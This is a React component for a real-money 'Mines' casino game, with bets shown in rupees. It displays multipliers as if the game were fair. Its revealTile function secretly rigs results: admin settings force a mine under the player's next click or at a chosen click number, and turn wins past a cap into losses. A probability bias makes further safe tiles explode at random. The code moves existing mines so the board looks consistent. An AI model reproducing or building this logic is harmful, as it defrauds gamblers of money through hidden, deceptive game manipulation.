import { useState, useCallback, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Bomb, Gem, Coins, RotateCcw, Play, Wallet, ShieldAlert, ChevronDown } from 'lucide-react';
import toast from 'react-hot-toast';

const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
    const [betAmount, setBetAmount] = useState(0);
    const [mineCount, setMineCount] = useState(settings?.defaultMines || 3);
    const [gameState, setGameState] = useState('idle'); // idle, playing, over
    const [grid, setGrid] = useState(Array(25).fill(null));
    const [mines, setMines] = useState([]);
    const [revealed, setRevealed] = useState([]);
    const [payout, setPayout] = useState(0);

    // Sync mine count if settings change
    useEffect(() => {
        if (settings?.defaultMines && gameState === 'idle') {
            setMineCount(settings.defaultMines);
        }
    }, [settings?.defaultMines, gameState]);

    const houseEdge = (settings?.houseEdge || 1) / 100;
    const probabilityBias = (settings?.minesProbBias || 0) / 100;

    // Pre-load sounds for instant playback
    const [audioObjects] = useState({
        click: new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3'),
        win: new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3'),
        loss: new Audio('https://assets.mixkit.co/active_storage/sfx/2018/2018-preview.mp3'),
        reveal: new Audio('https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3'),
        gem: new Audio('https://assets.mixkit.co/active_storage/sfx/600/600-preview.mp3') // Satisfying chime sound
    });

    const playSound = (type) => {
        if (isMuted) return;
        try {
            const sound = audioObjects[type];
            if (sound) {
                sound.currentTime = 0;
                sound.volume = 0.5;
                sound.play().catch(() => {
                    // Fallback for browsers that block auto-play or if URL fails
                    const tempAudio = new Audio(sound.src);
                    tempAudio.volume = 0.5;
                    tempAudio.play().catch(() => { });
                });
            }
        } catch (e) {
            console.error("Audio play error", e);
        }
    };

    // Calculate multiplier based on revealed tiles and mines
    const calculateMultiplier = (revealedCount) => {
        if (revealedCount === 0) return 0;
        let probability = 1.0;
        for (let i = 0; i < revealedCount; i++) {
            probability *= (25 - mineCount - i) / (25 - i);
        }
        const multiplier = (1 / probability) * (1 - houseEdge);
        return multiplier.toFixed(2);
    };

    const startGame = async () => {
        if (gameState === 'playing') return;
        if (betAmount <= 0) {
            toast.error('Please enter a valid bet amount');
            return;
        }
        const success = await onBet(betAmount);
        if (!success) return;

        playSound('click');
        const minePositions = [];
        while (minePositions.length < mineCount) {
            const pos = Math.floor(Math.random() * 25);
            if (!minePositions.includes(pos)) {
                minePositions.push(pos);
            }
        }

        setMines(minePositions);
        setGrid(Array(25).fill(null));
        setRevealed([]);
        setGameState('playing');
        setPayout(0);
    };

    const revealTile = (index) => {
        if (gameState !== 'playing' || revealed.includes(index)) return;

        // --- Precision Control & Difficulty Bias ---
        let finalIsMine = mines.includes(index);

        const forceMineHere = () => {
            if (!mines.includes(index)) {
                // To keep the mine count constant, we MOVE an existing mine to this position
                // rather than adding a new one.
                const newMines = [...mines];
                // Find a mine that hasn't been revealed yet (well, all mines in mines array are unrevealed by def in this game state)
                // We pick the first mine that isn't the current index and move it here.
                const mineToMoveIndex = newMines.findIndex(m => m !== index);
                if (mineToMoveIndex !== -1) {
                    newMines[mineToMoveIndex] = index;
                    setMines(newMines);
                }
            }
            return true;
        };

        // 1. Forced Trapping (Manual Admin Control)
        if (settings?.trapNextMine) {
            finalIsMine = forceMineHere();
            // Reset trap after one use
            import('../../firebase').then(({ db }) => {
                import('firebase/firestore').then(({ doc, updateDoc }) => {
                    updateDoc(doc(db, 'settings', 'casino'), { trapNextMine: false });
                });
            });
        } else if (settings?.trapAtClick > 0 && revealed.length + 1 === settings.trapAtClick) {
            // Trap exactly on the configured click number
            finalIsMine = forceMineHere();
        }

        // Auto max limit check (Prevent winning more than X)
        if (!finalIsMine && settings?.autoMaxMinesMultiplier > 0) {
            const nextMultiplier = calculateMultiplier(revealed.length + 1);
            if (nextMultiplier > settings.autoMaxMinesMultiplier) {
                finalIsMine = forceMineHere();
            }
        }
        // 2. Probability Bias (Passive Rigging)
        else if (!finalIsMine && settings?.minesProbBias > 0) {
            const rigChance = settings.minesProbBias / 100;
            if (Math.random() < rigChance) {
                finalIsMine = forceMineHere();
            }
        }

        const newRevealed = [...revealed, index];
        setRevealed(newRevealed);

        if (finalIsMine) {
            setGameState('over');
            setPayout(0);
            onLoss(betAmount);
            playSound('loss');
            toast.error('KABOOM! You hit a mine.', { icon: '💥' });
        } else {
            // Trigger sound immediately for each tile
            playSound('reveal');

            const multiplier = calculateMultiplier(newRevealed.length);
            setPayout((betAmount * multiplier).toFixed(2));

            if (newRevealed.length === 25 - mineCount) {
                cashOut(newRevealed);
            }
        }
    };

    const cashOut = async (finalRevealed = revealed) => {
        if (gameState !== 'playing' || finalRevealed.length === 0) return;
        const multiplier = calculateMultiplier(finalRevealed.length);
        const winAmount = Math.floor(betAmount * multiplier);
        setGameState('over');
        await onWin(winAmount);
        playSound('win');
        toast.success(`Cashed out at ${multiplier}x!`);
    };

    const currentMultiplier = calculateMultiplier(revealed.length);

    return (
        <div className="flex flex-col bg-[#0f212e] min-h-[600px] w-full">
            {/* Sidebar Controls - Top Stacked for Mobile */}
            <div className="w-full bg-[#1a2c38] p-4 flex flex-col gap-3 z-10 border-b border-[#0f212e] shrink-0">
                <div className="space-y-1.5">
                    <div className="flex justify-between items-center text-[#b1bad3] text-[10px] font-black uppercase tracking-[2px] px-1">
                        <span>Bet Amount</span>
                        <span>₹{betAmount.toLocaleString()}</span>
                    </div>
                    <div className="flex bg-[#0f212e] border-2 border-[#2f4553] rounded-[6px] h-[42px] overflow-hidden hover:border-[#557086] transition-all">
                        <input
                            type="number"
                            value={betAmount === 0 ? '' : betAmount}
                            onChange={(e) => setBetAmount(Math.max(0, parseFloat(e.target.value) || 0))}
                            disabled={gameState === 'playing'}
                            placeholder="0.00"
                            className="flex-1 bg-transparent px-3 text-white font-black outline-none text-sm placeholder:text-[#557086]"
                        />
                        <div className="flex bg-[#2f4553]">
                            <button onClick={() => setBetAmount(prev => Math.floor(prev / 2))} disabled={gameState === 'playing'} className="px-3 text-white font-bold hover:bg-[#3b5568] transition-colors border-r border-[#0f212e] text-xs">½</button>
                            <button onClick={() => setBetAmount(prev => prev * 2)} disabled={gameState === 'playing'} className="px-3 text-white font-bold hover:bg-[#3b5568] transition-colors text-xs">2×</button>
                        </div>
                    </div>
                </div>

                <div className="space-y-1.5">
                    <div className="text-[#b1bad3] text-[10px] font-black uppercase tracking-[2px] px-1">Mines Count</div>
                    <div className="relative">
                        <select
                            value={mineCount}
                            onChange={(e) => setMineCount(parseInt(e.target.value))}
                            disabled={gameState === 'playing'}
                            className="w-full bg-[#0f212e] border-2 border-[#2f4553] rounded-[6px] py-2 px-3 text-white font-black outline-none appearance-none hover:border-[#557086] transition-all text-sm cursor-pointer pr-10"
                        >
                            {[...Array(24)].map((_, i) => (<option key={i + 1} value={i + 1} className="bg-[#0f212e]">{i + 1} Mines</option>))}
                        </select>
                        <ChevronDown size={16} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#b1bad3] pointer-events-none" />
                    </div>
                </div>

                <button
                    onClick={gameState === 'playing' ? () => cashOut() : startGame}
                    className={`w-full py-4 rounded-[6px] font-black uppercase text-sm shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 mt-2 transition-all ${
                        gameState === 'playing' ? 'bg-[#00e701] text-black' : 'bg-[#00e701] text-[#05200a]'
                    }`}
                >
                    {gameState === 'playing' ? (
                        <div className="flex flex-col items-center leading-none">
                            <span className="text-[9px] mb-1 opacity-70">Cash Out</span>
                            <span>₹{payout}</span>
                        </div>
                    ) : 'Bet (Start Game)'}
                </button>
            </div>

            {/* Game Grid Area */}
            <div className="flex-1 bg-[#0f212e] p-4 flex flex-col items-center justify-center relative min-h-[450px]">
                {/* Visual Multiplier Info */}
                <div className="mb-4 text-center">
                    <p className="text-[#557086] text-[10px] font-black uppercase tracking-[3px]">Next Multiplier</p>
                    <p className="text-white text-2xl font-black italic tracking-tighter">{calculateMultiplier(revealed.length + 1)}x</p>
                </div>

                <div className="grid grid-cols-5 gap-2 w-full max-w-[360px] aspect-square mx-auto bg-[#0a1e29]/50 p-2 rounded-[6px] border border-white/5 shadow-2xl">
                    {grid.map((tile, i) => {
                        const isRevealed = revealed.includes(i);
                        const isMine = mines.includes(i);
                        const isOver = gameState === 'over';
                        return (
                            <button
                                key={i}
                                onClick={() => revealTile(i)}
                                disabled={isRevealed || isOver}
                                className={`group relative rounded-[6px] transition-all duration-75 aspect-square flex items-center justify-center border-b-4
                                    ${isRevealed
                                        ? isMine ? 'bg-[#ef4444] border-red-900 ring-2 ring-red-500/50' : 'bg-[#0f212e] border-[#102c38] ring-1 ring-[#00e701]/20'
                                        : isOver
                                            ? isMine ? 'bg-[#1a2c38] border-black opacity-60' : 'bg-[#213743] border-black opacity-30 shadow-none'
                                            : 'bg-[#2f4553] hover:bg-[#3b5568] border-[#213743] hover:border-[#2f4553] shadow-lg active:translate-y-0.5 active:border-b-0'
                                    }
                                `}
                            >
                                <AnimatePresence mode="wait">
                                    {(isRevealed || (isOver && isMine)) && (
                                        <motion.div initial={{ scale: 0, rotate: -20 }} animate={{ scale: 1, rotate: 0 }} className="w-[75%] h-[75%] flex items-center justify-center">
                                            {isMine ? (
                                                <div className={`w-full h-full rounded-[6px] flex items-center justify-center ${isRevealed ? 'animate-bounce' : ''}`}>
                                                    <Bomb size={24} className={isRevealed ? 'text-white' : 'text-[#ef4444] opacity-30'} fill="currentColor" />
                                                </div>
                                            ) : (
                                                <div className="text-[#00e701] drop-shadow-[0_0_12px_rgba(0,231,1,0.5)]">
                                                    <Gem size={28} fill="currentColor" />
                                                </div>
                                            )}
                                        </motion.div>
                                    )}
                                </AnimatePresence>
                            </button>
                        );
                    })}
                </div>

                {/* Over Win Popup */}
                <AnimatePresence>
                    {gameState === 'over' && payout > 0 && (
                        <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="absolute z-20 pointer-events-none">
                            <div className="bg-[#0f212e]/95 border-[4px] border-[#00e701] rounded-[6px] p-8 flex flex-col items-center justify-center shadow-[0_0_50px_rgba(0,0,0,0.8)] backdrop-blur-md">
                                <div className="text-[#00e701] text-[40px] font-black tracking-tighter leading-none mb-2">{currentMultiplier}x</div>
                                <div className="text-[10px] font-black text-[#557086] uppercase tracking-[4px] mb-4">Total Win</div>
                                <div className="text-white font-black text-3xl italic tracking-tighter">
                                    <span className="text-[#00e701]">₹</span>{(betAmount * currentMultiplier).toFixed(0)}
                                </div>
                            </div>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </div>
    );
};

export default MinesGame;
